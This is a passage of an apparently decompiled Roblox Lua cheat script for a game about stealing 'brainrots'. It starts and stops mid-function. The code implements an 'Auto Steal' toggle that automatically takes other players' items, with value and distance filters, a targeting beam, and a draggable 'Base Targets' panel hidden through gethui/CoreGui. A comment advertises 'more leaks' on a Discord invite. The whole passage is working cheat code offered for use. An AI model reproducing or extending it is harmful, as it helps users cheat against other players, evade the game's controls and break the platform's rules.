							if not (flag9 and string.find(flag9, "v20")) and localPlayer:GetAttribute("Stealing") == true then
								flag8 = true
								func49()

								if flag6 then
									func55("GET READY - carrying brainrot", "")
								end

								while flag3 and flag4 and flag59 == n5 and localPlayer:GetAttribute("Stealing") == true do
									if flag9 and string.find(flag9, "v19") then
										task.wait()
									else
										task.wait(0.05)
									end
								end
								-- more leaks: https://discord.gg/x7YbZeezpm

								if not (flag9 and string.find(flag9, "v19")) then
									func64(flag59)
								end

								flag8 = false

								if flag9 and string.find(flag9, "v19") then
									flag60 = true
								end
							else
								if not (flag9 and string.find(flag9, "v20")) then
									func16(nil)
								end

								flag8 = false
								local character_ = localPlayer.Character
								character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

								if not character_ then
									func49()
								else
									local value77, value78, value79

									if flag5 then
										value77, value78, value79 = func18(character_)
									else
										value77, value78 = func17(character_)
										value79 = nil
									end

									local flag63 = func12(character_, value77, value78, value79)
									func15(flag63)

									if not flag63 then
										func49()
									else
										prompt = flag63.Prompt

										if not func60(flag63, flag59, function()
											return func63(flag63, flag59, false)
										end, func50, false) then
											func49()
										end
									end
								end
							end

							continue
						end
					end

					break
				end
			end

			func13 = function()
				n5 += 1
				flag4 = true
				flag8 = false
				n7 = -math.huge
				func56()
				task.spawn(func65, n5)
			end
		end

		func14 = function()
			flag4 = false
			flag8 = false
			n5 += 1
			func49()
			func16(nil)
			func56()
		end

		local n12 = 0

		func4(localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
			if localPlayer:GetAttribute("Stealing") == true then
				n6 = os.clock()
				n12 += 1
				local value80 = n12

				task.spawn(function()
					task.wait(1.5)

					if flag4 and localPlayer:GetAttribute("Stealing") == true and n12 == value80 then
						func14()
						task.wait(0.05)
						func13()
					end
				end)
			else
				n12 += 1

				if not (os.clock() - n4 < 0.5) then
					local flag64 = false

					if RagdollController then
						local ok, result = pcall(function()
							return RagdollController.IsInRagdoll()
						end)

						if ok and result == true then
							flag64 = true
						end
					end

					if not flag64 then
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChildOfClass("Humanoid")

						if character_ then
							local state = character_:GetState()

							if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.Ragdoll then
								flag64 = true
							end
						end
					end

					local flag65

					if not flag64 then
						local character_ = localPlayer.Character

						if character_ and character_:FindFirstChildOfClass("BallSocketConstraint", true) then
							flag65 = true
						else
							flag65 = flag64
						end
					else
						flag65 = flag64
					end

					if flag65 then
						flag7 = true
					end
				end
			end
		end))

		func4(Workspace.ChildAdded:Connect(function(child)
			if child.Name == "Plots" then
				n7 = -math.huge
			end
		end))

		local plots = Workspace:FindFirstChild("Plots")

		if plots then
			func4(plots.ChildAdded:Connect(function()
				n7 = -math.huge
			end))

			func4(plots.ChildRemoved:Connect(function()
				n7 = -math.huge
			end))
		end

		local obj26

		obj26 = obj17:CreateToggle({
			Name = "Auto Steal",
			Default = true,
			Callback = function(value)
				flag9 = "Auto Get Default"

				if value then
					func13()
				else
					func14()
				end
			end,
		})

		local func66

		func66 = function()
			if obj26 and obj26.Get and obj26:Get() ~= true then
				obj26:Set(true, true)
			end
		end

		obj17:CreateToggle({
			Name = "Steal Best Brainrot Only",
			Default = false,
			Quick = false,
			SubOf = obj26,
			Callback = function(value)
				flag5 = value == true
			end,
		})

		do
			local tbl28 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
			}

			local createSlider = nil
			local n13 = 1
			local str9 = "M/s"

			local function func67(flag66, flag67)
				if flag66 ~= nil then
					n13 = math.floor(tonumber(flag66) or n13)
				end

				if flag67 ~= nil then
					str9 = tostring(flag67)
				elseif createSlider and createSlider.GetUnit then
					local unit = createSlider:GetUnit()

					if unit and unit ~= "" then
						str9 = tostring(unit)
					end
				end

				n2 = n13 * (tbl28[str9] or tbl28["M/s"]).Mult
				n7 = -math.huge
			end

			local function func68(param24)
				str9 = param24
				local ms = tbl28[param24] or tbl28["M/s"]

				if createSlider and createSlider.SetRange then
					createSlider:SetRange(ms.Min, ms.Max)
					local min = createSlider:Get() or ms.Min
					local min2 = ms.Min
					local max = ms.Max
					local n14 = math.clamp(math.floor(min + 0.5), min2, max)

					if n14 ~= min then
						createSlider:Set(n14)
					else
						func67(n14, param24)
					end
				else
					func67(nil, param24)
				end
			end

			createSlider = obj17.CreateSlider

			createSlider = createSlider(obj17, {
				Name = "Auto Steal Min Value",
				Note = "Filters out Brainrots below this threshold. Tap arrow to change unit (K/s, M/s, B/s).",
				Min = 0,
				Max = 1000,
				Default = 0,
				AllowDecimals = false,
				Increment = 1,
				Unit = {
					Default = "M/s",
					Selector = true,
					Options = { "K/s", "M/s", "B/s" },
					ColorEnabled = true,
					Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
					Callback = function(value)
						func68(value)
					end,
				},
				Quick = false,
				SubOf = obj26,
				Callback = function(value)
					func67(value, nil)
				end,
			})
		end

		obj17:CreateSlider({
			Name = "Auto Steal Distance",
			Min = 10,
			Max = 200,
			Default = 58,
			AllowDecimals = false,
			Increment = 1,
			Unit = " studs",
			Quick = false,
			SubOf = obj26,
			Callback = function(value)
				n3 = math.clamp(tonumber(value) or 20, 10, 200)
			end,
		})

		local func69

		do
			local color = Color3.fromRGB(170, 255, 0)
			local color2 = Color3.fromRGB(240, 255, 210)
			local flag68 = false
			local attachment = nil
			local attachment2 = nil
			local beam = nil
			local value81 = nil
			local value82 = nil
			local n13 = -math.huge

			func69 = function()
				pcall(function()
					if beam then
						beam:Destroy()
					end
				end)

				pcall(function()
					if attachment then
						attachment:Destroy()
					end
				end)

				pcall(function()
					if attachment2 then
						attachment2:Destroy()
					end
				end)

				beam = nil
				attachment = nil
				attachment2 = nil
				value81 = nil
				value82 = nil
			end

			local function func70()
				local obj27 = Workspace:FindFirstChild(localPlayer.Name)
				if not obj27 or not obj27:IsA("Model") then
					return nil
				end
				local humanoidRootPart = obj27:FindFirstChild("HumanoidRootPart")
				if humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart.Parent == obj27 then
					return humanoidRootPart
				end
				local hitbox = obj27:FindFirstChild("__HITBOX") or obj27:FindFirstChild("__hitbox") or obj27:FindFirstChild("Hitbox") or obj27:FindFirstChild("HitBox")
				if hitbox and hitbox:IsA("BasePart") then
					return hitbox
				end
				return nil
			end

			local function func71(parent, parent2)
				func69()
				if not (parent and parent2) then
					return
				end
				attachment = Instance.new("Attachment")
				attachment.Name = func1()
				attachment.Position = Vector3.new(0, 0.6, 0)
				attachment.Parent = parent
				attachment2 = Instance.new("Attachment")
				attachment2.Name = func1()
				attachment2.Position = Vector3.new(0, 2.6, 0)
				attachment2.Parent = parent2
				beam = Instance.new("Beam")
				beam.Name = func1()
				beam.Archivable = false
				beam.Attachment0 = attachment
				beam.Attachment1 = attachment2
				beam.Color = ColorSequence.new(color, color2)
				beam.CurveSize0 = 0
				beam.CurveSize1 = 0
				beam.FaceCamera = true
				beam.LightEmission = 1
				beam.Segments = 4
				beam.Texture = "rbxassetid://446111271"
				beam.TextureLength = 3
				beam.TextureMode = Enum.TextureMode.Wrap
				beam.TextureSpeed = 3
				local value83 = beam
				local numberSequence = NumberSequence.new
				local value84 = NumberSequenceKeypoint.new(0, 0)
				local value85 = NumberSequenceKeypoint.new(0.85, 0)
				local tbl29 = { value84, value85 }

				do
					local values = table.pack(NumberSequenceKeypoint.new(1, 0.25))
					table.move(values, 1, values.n, 3, tbl29)
				end

				value83.Transparency = numberSequence(tbl29)
				beam.Width0 = 0.34
				beam.Width1 = 0.7
				beam.ZOffset = 0.1
				obj[beam] = true
				beam.Parent = attachment
				value81 = parent
				value82 = parent2
			end

			local function func72()
				if not (flag68 and flag4) then
					if beam then
						func69()
					end

					return
				end

				local now = os.clock()
				if now - n13 < 0.1 then
					return
				end
				n13 = now
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				local flag69 = func70(character_)
				if not (humanoidRootPart and flag69) then
					func69()
					return
				end
				local value86, value87, value88 = func18(humanoidRootPart)
				local flag70 = func12(humanoidRootPart, value86, value87, value88)
				local spawn = flag70 and func10(flag70.Prompt) or nil
				spawn = spawn and spawn.Spawn or nil
				if not spawn then
					func69()
					return
				end
				local flag71 = value81 ~= flag69 or value82 ~= spawn

				if not flag71 then
					flag71 = not (attachment and attachment.Parent)
				end

				if flag71 then
					func71(flag69, spawn)
				end
			end

			func4(RunService.Heartbeat:Connect(function()
				if flag3 then
					func72()
				end
			end))

			obj17:CreateToggle({
				Name = "Target Beam",
				Note = "Draws a straight amber line to the Brainrot Auto Steal is targeting.",
				Default = true,
				Quick = false,
				SubOf = obj26,
				Callback = function(value)
					flag68 = value == true

					if not flag68 then
						func69()
					end
				end,
			})
		end

		local n13
		n13 = 140
		local n14
		n14 = 5
		local n15
		n15 = 0.5
		local color
		color = Color3.fromRGB(58, 255, 55)
		local n16
		n16 = 214
		local n17
		n17 = 40
		local n18
		n18 = 44
		local screenGui3
		screenGui3 = nil
		local flag72
		flag72 = nil
		local value89
		value89 = nil
		local tbl30
		tbl30 = {}
		local value90
		value90 = nil
		local flag73
		flag73 = nil
		local flag74, n19, n20, func73, flag75, n21, str10, func74

		do
			local value91 = nil
			local value92 = nil
			local value93 = nil
			flag74 = false
			n19 = 5
			n20 = 1
			func73 = nil
			flag75 = false
			n21 = -math.huge
			local value94 = nil
			local n22 = -math.huge
			str10 = ""
			local gothamBold = Enum.Font.GothamBold

			pcall(function()
				gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
			end)

			local function func75(param25)
				if typeof(gothamBold) == "Font" then
					param25.FontFace = gothamBold
				else
					param25.Font = Enum.Font.GothamBold
				end
			end

			local obj28 = obj7:CreateState({
				Name = "Base Target Panel Position",
				Default = {
					XOffset = 0,
					XScale = 0.78183454275131226,
					YScale = 0.022769367322325706,
					YOffset = 0,
				},
			})

			local function func76()
				local value95 = obj28:Get()
				if type(value95) == "table" and type(value95.XOffset) == "number" and type(value95.YOffset) == "number" then
					return UDim2.new(tonumber(value95.XScale) or 1, value95.XOffset, tonumber(value95.YScale) or 0.5, value95.YOffset)
				end
				return UDim2.new(1, -18, 0.5, 0)
			end

			local function func77(param26)
				obj28:Set({ XScale = param26.X.Scale, XOffset = param26.X.Offset, YScale = param26.Y.Scale, YOffset = param26.Y.Offset })
			end

			local tweenInfo = TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
			local n23 = 0
			local value96 = nil

			local function func78()
				if not flag72 then
					return
				end
				local visible2 = n23 == 0 and not flag74

				if value91 then
					value91.Visible = visible2
					value91.Text = value96 and "no brainrot left in this base" or "no base nearby"
				end

				local n24 = flag74 and 0 or n23
				local n25

				if n24 > 0 then
					n25 = (n17 + 4) * n24 + 4
				else
					n25 = 0

					if visible2 then
						n25 = 26
					end
				end

				local n26 = n18 + n25
				if value92 == n26 then
					return
				end
				value92 = n26

				if flag73 then
					if n25 > 0 then
						flag73.Visible = true
					end

					TweenService:Create(flag73, tweenInfo, { Size = UDim2.new(1, -20, 0, math.max(n25, 1)) }):Play()
				end

				local tween = TweenService:Create(flag72, tweenInfo, { Size = UDim2.fromOffset(214, n26) })

				if n25 <= 0 and flag73 then
					tween.Completed:Connect(function()
						if flag73 and value92 == n26 then
							flag73.Visible = false
						end
					end)
				end

				tween:Play()
			end

			func74 = function()
				table.clear(tbl30)
				flag72 = nil
				value89 = nil
				value90 = nil
				flag73 = nil
				value91 = nil
				value92 = nil
				value93 = nil
				func73 = nil
				str10 = ""

				if screenGui3 then
					pcall(function()
						screenGui3:Destroy()
					end)

					screenGui3 = nil
				end
			end

			local function func79(part7, flag76)
				local debris = Workspace:FindFirstChild("Debris")
				if not debris or flag76 == "" then
					return nil
				end
				local value97 = nil
				local value98 = nil

				for _, child in ipairs(debris:GetChildren()) do
					if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
						local animalOverhead = child:FindFirstChild("AnimalOverhead")
						local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

						if displayName and displayName:IsA("TextLabel") and displayName.Text == flag76 then
							local magnitude = (child.Position - part7.Position).Magnitude

							if not value97 or magnitude < value97 then
								value97 = magnitude
								value98 = animalOverhead
							end
						end
					end
				end

				if value98 and value97 and value97 <= 14 then
					return value98
				end
				return nil
			end

			local function func80(instance8, part8, flag77)
				if not (instance8 and part8) or flag77 == "" then
					return nil
				end
				local value99 = nil
				local value100 = nil

				for _, child in ipairs(instance8:GetChildren()) do
					if child:IsA("Model") and child.Name == flag77 then
						local ok, result = pcall(function()
							return child:GetPivot()
						end)

						if ok then
							local magnitude = (result.Position - part8.Position).Magnitude

							if not value99 or magnitude < value99 then
								value100 = child
								value99 = magnitude
							end
						end
					end
				end

				if value100 and value99 and value99 <= 14 then
					return value100
				end
				return nil
			end

			local str11 = ""

			local function func81(list10, painted)
				if list10.Painted == painted then
					return
				end
				list10.Painted = painted
				local func82 = ipairs
				local tweens = list10.Tweens or {}

				for _, tween in func82(tweens) do
					pcall(function()
						tween:Cancel()
					end)
				end

				local tween = TweenService:Create(list10.Accent, tweenInfo, { Size = UDim2.new(0, painted and 3 or 0, 1, -12) })
				local tween2 = TweenService:Create(list10.Stroke, tweenInfo, { Color = painted and color or Color3.fromRGB(255, 255, 255), Transparency = painted and 0.1 or 0.86 })
				local value101 = TweenService
				local create = value101.Create
				local row = list10.Row
				local tbl31 = { BackgroundTransparency = painted and 0.12 or 0.4 }
				local packed2 = table.pack(create(value101, row, tweenInfo, tbl31))
				local tweens2 = { tween, tween2 }

				do
					local values = table.pack(table.unpack(packed2, 1, packed2.n))
					table.move(values, 1, values.n, 3, tweens2)
				end

				list10.Tweens = tweens2

				for _, tween3 in ipairs(list10.Tweens) do
					tween3:Play()
				end
			end

			local function func83()
				for _, item16 in ipairs(tbl30) do
					func81(item16, prompt2 ~= nil and item16.Prompt == prompt2)
				end
			end

			local function func84(layoutOrder)
				local textButton = Instance.new("TextButton")
				textButton.AutoButtonColor = false
				textButton.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
				textButton.BackgroundTransparency = 0.3
				textButton.BorderSizePixel = 0
				textButton.LayoutOrder = layoutOrder
				textButton.Size = UDim2.new(1, 0, 0, 40)
				textButton.Text = ""
				textButton.Parent = value89
				Instance.new("UICorner", textButton).CornerRadius = UDim.new(0, 9)
				local frame4 = Instance.new("Frame")
				frame4.AnchorPoint = Vector2.new(0, 0.5)
				frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				frame4.BorderSizePixel = 0
				frame4.Position = UDim2.new(0, 0, 0.5, 0)
				frame4.Size = UDim2.new(0, 0, 1, -12)
				frame4.ZIndex = 4
				frame4.Parent = textButton
				Instance.new("UICorner", frame4).CornerRadius = UDim.new(1, 0)
				local uiGradient = Instance.new("UIGradient")
				local new = ColorSequenceKeypoint.new
				local color2 = Color3.fromRGB
				uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(58, 255, 55)), new(1, color2(20, 109, 0)) })
				uiGradient.Rotation = 90
				uiGradient.Parent = frame4
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Thickness = 1.3
				uiStroke.Parent = textButton
				local viewportFrame = Instance.new("ViewportFrame")
				viewportFrame.Ambient = Color3.fromRGB(190, 190, 200)
				viewportFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
				viewportFrame.BackgroundTransparency = 0.25
				viewportFrame.BorderSizePixel = 0
				viewportFrame.LightColor = Color3.fromRGB(255, 255, 255)
				viewportFrame.LightDirection = Vector3.new(-0.4, -0.7, -0.6)
				viewportFrame.Position = UDim2.fromOffset(4, 3)
				viewportFrame.Size = UDim2.fromOffset(n17 - 6, n17 - 6)
				viewportFrame.Parent = textButton
				Instance.new("UICorner", viewportFrame).CornerRadius = UDim.new(0, 8)
				local camera = Instance.new("Camera")
				camera.Parent = viewportFrame
				viewportFrame.CurrentCamera = camera
				local frame5 = Instance.new("Frame")
				frame5.AnchorPoint = Vector2.new(1, 1)
				frame5.BackgroundColor3 = Color3.fromRGB(10, 10, 13)
				frame5.BackgroundTransparency = 0.15
				frame5.BorderSizePixel = 0
				frame5.Position = UDim2.fromOffset(n17 - 3, n17 - 3)
				frame5.Size = UDim2.fromOffset(24, 13)
				frame5.ZIndex = 4
				frame5.Parent = textButton
				Instance.new("UICorner", frame5).CornerRadius = UDim.new(0, 5)
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1
				textLabel3.Size = UDim2.fromScale(1, 1)
				textLabel3.Text = ""
				textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel3.TextScaled = true
				textLabel3.ZIndex = 5
				func75(textLabel3)
				textLabel3.Parent = frame5
				local uiStroke2 = Instance.new("UIStroke")
				uiStroke2.Color = Color3.fromRGB(0, 0, 0)
				uiStroke2.Thickness = 1.4
				uiStroke2.Transparency = 0.25
				uiStroke2.Parent = textLabel3
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(n17 + 2, 5)
				textLabel4.Size = UDim2.new(1, -n17 - 10, 0, 13)
				textLabel4.Text = ""
				textLabel4.TextColor3 = Color3.fromRGB(238, 238, 242)
				textLabel4.TextScaled = true
				textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				func75(textLabel4)
				textLabel4.Parent = textButton
				local value102 = chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle(textLabel4)
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.BackgroundTransparency = 1
				textLabel5.Position = UDim2.fromOffset(n17 + 2, 20)
				textLabel5.Size = UDim2.fromOffset(62, 11)
				textLabel5.Text = ""
				textLabel5.TextColor3 = Color3.fromRGB(115, 255, 0)
				textLabel5.TextScaled = true
				textLabel5.TextXAlignment = Enum.TextXAlignment.Left
				func75(textLabel5)
				textLabel5.Parent = textButton
				local textLabel6 = Instance.new("TextLabel")
				textLabel6.BackgroundTransparency = 1
				textLabel6.Position = UDim2.fromOffset(n17 + 66, 20)
				textLabel6.RichText = true
				textLabel6.Size = UDim2.fromOffset(62, 11)
				textLabel6.Text = ""
				textLabel6.TextScaled = true
				textLabel6.TextXAlignment = Enum.TextXAlignment.Left
				func75(textLabel6)
				textLabel6.Parent = textButton
				local frame6 = Instance.new("Frame")
				frame6.AnchorPoint = Vector2.new(1, 0)
				frame6.BackgroundTransparency = 1
				frame6.Position = UDim2.new(1, -7, 0, 19)
				frame6.Size = UDim2.fromOffset(44, 12)
				frame6.Parent = textButton
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Horizontal
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.Padding = UDim.new(0, 2)
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
				uiListLayout.Parent = frame6

				local tbl32 = {
					Row = textButton,
					Accent = frame4,
					Stroke = uiStroke,
					Viewport = viewportFrame,
					Camera = camera,
					Rank = textLabel3,
					NameLabel = textLabel4,
					NameStyle = value102,
					ValueLabel = textLabel5,
					MutationLabel = textLabel6,
					TraitHolder = frame6,
					Prompt = nil,
					RowKey = nil,
					ModelKey = nil,
					Clone = nil,
					Track = nil,
					SourceTrack = nil,
					Painted = nil,
					Tweens = nil,
				}

				func5(textButton, function()
					if not tbl32.Prompt then
						return
					end

					if prompt2 == tbl32.Prompt then
						prompt2 = nil
						str11 = ""
					else
						prompt2 = tbl32.Prompt
						str11 = tbl32.NameLabel.Text
						func66()
					end

					str10 = ""
					func83()
				end)

				return tbl32
			end

			local function func85()
				if screenGui3 and screenGui3.Parent then
					return
				end
				screenGui3 = Instance.new("ScreenGui")
				screenGui3.Name = "ChilliAutoGetTargetPanel"
				screenGui3.DisplayOrder = 5
				screenGui3.IgnoreGuiInset = true
				screenGui3.ResetOnSpawn = false
				screenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				local parent = CoreGui

				if type(gethui) == "function" then
					local ok
					ok, parent = pcall(gethui)
					ok = ok and typeof(parent) == "Instance"
					local value103 = CoreGui

					if not ok then
						parent = value103
					end
				end

				screenGui3.Parent = parent
				local frame4 = Instance.new("Frame")
				frame4.Active = true
				frame4.AnchorPoint = Vector2.new(1, 0)
				frame4.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
				frame4.BackgroundTransparency = 0.18
				frame4.BorderSizePixel = 0
				frame4.Position = func76()
				frame4.Size = UDim2.fromOffset(214, 44)
				frame4.ClipsDescendants = true
				frame4.Parent = screenGui3
				Instance.new("UICorner", frame4).CornerRadius = UDim.new(0, 14)
				flag72 = frame4
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1
				uiStroke.Transparency = 0.9
				uiStroke.Parent = frame4
				local uiScale = Instance.new("UIScale")
				uiScale.Parent = frame4

				local function func86()
					local currentCamera = Workspace.CurrentCamera
					local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

					if viewportSize.X < 1 then
						viewportSize = Vector2.new(1280, 720)
					end

					uiScale.Scale = math.clamp(viewportSize.X * 0.15 / n16, 0.7, 1.3) * n20
				end

				func73 = func86
				func86()
				local currentCamera = Workspace.CurrentCamera

				if currentCamera then
					func4(currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func86))
				end

				local textButton = Instance.new("TextButton")
				textButton.Name = "Handle"
				textButton.Active = true
				textButton.AutoButtonColor = false
				textButton.BackgroundTransparency = 1
				textButton.BorderSizePixel = 0
				textButton.Position = UDim2.fromOffset(0, 0)
				textButton.Size = UDim2.new(1, 0, 0, 44)
				textButton.Text = ""
				textButton.ZIndex = 2
				textButton.Parent = frame4
				local value104 = nil
				local flag78 = false
				local value105 = nil
				local flag79 = false
				local vector2 = Vector2.new(0, 0)
				local vector22 = Vector2.new(0, 0)

				textButton.InputBegan:Connect(function(input)
					if flag78 or input.UserInputState ~= Enum.UserInputState.Begin then
						return
					end

					if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
						return
					end
					local vector23 = Vector2.new(input.Position.X, input.Position.Y)
					local absolutePosition = textButton.AbsolutePosition
					local absoluteSize = textButton.AbsoluteSize
					if vector23.X < absolutePosition.X or vector23.X > absolutePosition.X + absoluteSize.X or vector23.Y < absolutePosition.Y or vector23.Y > absolutePosition.Y + absoluteSize.Y then
						return
					end

					for _, child in ipairs(textButton:GetChildren()) do
						if child:IsA("GuiButton") and child.Visible then
							local absolutePosition2 = child.AbsolutePosition
							local absoluteSize2 = child.AbsoluteSize
							if vector23.X >= absolutePosition2.X and vector23.X <= absolutePosition2.X + absoluteSize2.X and vector23.Y >= absolutePosition2.Y and vector23.Y <= absolutePosition2.Y + absoluteSize2.Y then
								return
							end
						end
					end

					local absoluteSize2 = screenGui3.AbsoluteSize
					if absoluteSize2.X <= 0 or absoluteSize2.Y <= 0 then
						return
					end
					flag78 = true
					flag79 = false
					value105 = input.UserInputType == Enum.UserInputType.Touch and input or nil
					vector2 = Vector2.new(input.Position.X, input.Position.Y)
					vector22 = Vector2.new(frame4.Position.X.Scale + frame4.Position.X.Offset / absoluteSize2.X, frame4.Position.Y.Scale + frame4.Position.Y.Offset / absoluteSize2.Y)
				end)

				func4(UserInputService2.InputChanged:Connect(function(input)
					if not flag78 then
						return
					end

					if not (value105 and input == value105 or not value105 and input.UserInputType == Enum.UserInputType.MouseMovement) or not flag72 then
						return
					end
					local absoluteSize = screenGui3.AbsoluteSize
					if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
						return
					end
					local n24 = Vector2.new(input.Position.X, input.Position.Y) - vector2
					if not flag79 and n24.Magnitude < 6 then
						return
					end
					flag79 = true
					frame4.Position = UDim2.fromScale(math.clamp(vector22.X + n24.X / absoluteSize.X, math.min(math.max(frame4.AbsoluteSize.X / absoluteSize.X, 0), 0.998), 0.998), math.clamp(vector22.Y + n24.Y / absoluteSize.Y, 0, 0.98))
				end))

				func4(UserInputService2.InputEnded:Connect(function(input)
					if not flag78 then
						return
					end

					if input.UserInputType == Enum.UserInputType.MouseButton1 or input == value105 then
						flag78 = false
						value105 = nil

						if flag79 then
							func77(frame4.Position)
						elseif value104 then
							value104()
						end
					end
				end))

				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1
				textLabel3.Position = UDim2.fromOffset(32, 8)
				textLabel3.Size = UDim2.fromOffset(n16 - 102, 14)
				textLabel3.Text = "Base Targets"
				textLabel3.TextColor3 = Color3.fromRGB(240, 240, 244)
				textLabel3.TextScaled = true
				textLabel3.TextXAlignment = Enum.TextXAlignment.Left
				func75(textLabel3)
				textLabel3.Parent = textButton
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(32, 23)
				textLabel4.Size = UDim2.fromOffset(n16 - 102, 10)
				textLabel4.Text = "walk into a base"
				textLabel4.TextColor3 = Color3.fromRGB(140, 140, 150)
				textLabel4.TextScaled = true
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				func75(textLabel4)
				textLabel4.Parent = textButton
				value90 = textLabel4
				local textButton2 = Instance.new("TextButton")
				textButton2.AnchorPoint = Vector2.new(0, 0.5)
				textButton2.AutoButtonColor = false
				textButton2.BackgroundTransparency = 1
				textButton2.BorderSizePixel = 0
				textButton2.Position = UDim2.new(0, 8, 0, math.floor(n18 * 0.5))
				textButton2.Size = UDim2.fromOffset(20, 20)
				textButton2.Text = ""
				textButton2.ZIndex = 6
				textButton2.Parent = textButton
				local frame5 = Instance.new("Frame")
				frame5.AnchorPoint = Vector2.new(0.5, 0.5)
				frame5.BackgroundTransparency = 1
				frame5.BorderSizePixel = 0
				frame5.Position = UDim2.fromScale(0.5, 0.5)
				frame5.Size = UDim2.fromScale(0.62, 0.62)
				frame5.Parent = textButton2
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
				uiAspectRatioConstraint.Parent = frame5

				for _, item17 in ipairs({ { 0.335355, 45 }, { 0.664645, -45 } }) do
					local frame6 = Instance.new("Frame")
					frame6.AnchorPoint = Vector2.new(0.5, 0.5)
					frame6.BackgroundColor3 = Color3.fromRGB(58, 255, 55)
					frame6.BorderSizePixel = 0
					frame6.Position = UDim2.fromScale(item17[1], 0.535355)
					frame6.Rotation = item17[2]
					frame6.Size = UDim2.fromScale(0.6657, 0.2)
					frame6.Parent = frame5
				end

				value93 = frame5
				frame5.Rotation = flag74 and 180 or 0

				value104 = function()
					flag74 = not flag74
					TweenService:Create(frame5, tweenInfo, { Rotation = flag74 and 180 or 0 }):Play()
					func78()
				end

				func5(textButton2, value104)
				local textButton3 = Instance.new("TextButton")
				textButton3.AnchorPoint = Vector2.new(1, 0)
				textButton3.AutoButtonColor = false
				textButton3.BackgroundColor3 = Color3.fromRGB(34, 34, 40)
				textButton3.BackgroundTransparency = 0.2
				textButton3.BorderSizePixel = 0
				textButton3.Position = UDim2.new(1, -10, 0, 8)
				textButton3.Size = UDim2.fromOffset(58, 20)
				textButton3.Text = ""
				textButton3.Parent = textButton
				Instance.new("UICorner", textButton3).CornerRadius = UDim.new(1, 0)
				local uiStroke2 = Instance.new("UIStroke")
				uiStroke2.Color = Color3.fromRGB(255, 255, 255)
				uiStroke2.Thickness = 1.2
				uiStroke2.Transparency = 0.78
				uiStroke2.Parent = textButton3
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.BackgroundTransparency = 1
				textLabel5.Position = UDim2.fromOffset(9, 5)
				textLabel5.Size = UDim2.fromOffset(9, 10)
				textLabel5.Text = "X"
				textLabel5.TextColor3 = Color3.fromRGB(226, 226, 232)
				textLabel5.TextScaled = true
				func75(textLabel5)
				textLabel5.Parent = textButton3
				local textLabel6 = Instance.new("TextLabel")
				textLabel6.BackgroundTransparency = 1
				textLabel6.Position = UDim2.fromOffset(21, 5)
				textLabel6.Size = UDim2.fromOffset(30, 10)
				textLabel6.Text = "Clear"
				textLabel6.TextColor3 = Color3.fromRGB(226, 226, 232)
				textLabel6.TextScaled = true
				textLabel6.TextXAlignment = Enum.TextXAlignment.Left
				func75(textLabel6)
				textLabel6.Parent = textButton3

				local function func87(flag80)
					local color2 = flag80 and Color3.fromRGB(255, 150, 150) or Color3.fromRGB(226, 226, 232)
					TweenService:Create(textButton3, tweenInfo, { BackgroundTransparency = flag80 and 0.05 or 0.2 }):Play()

					TweenService:Create(uiStroke2, tweenInfo, {
						Color = flag80 and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(255, 255, 255),
						Transparency = flag80 and 0.25 or 0.78,
					}):Play()

					TweenService:Create(textLabel5, tweenInfo, { TextColor3 = color2 }):Play()
					TweenService:Create(textLabel6, tweenInfo, { TextColor3 = color2 }):Play()
				end

				textButton3.MouseEnter:Connect(function()
					func87(true)
				end)

				textButton3.MouseLeave:Connect(function()
					func87(false)
				end)

				func5(textButton3, function()
					prompt2 = nil
					str11 = ""
					str10 = ""
					func83()
				end)

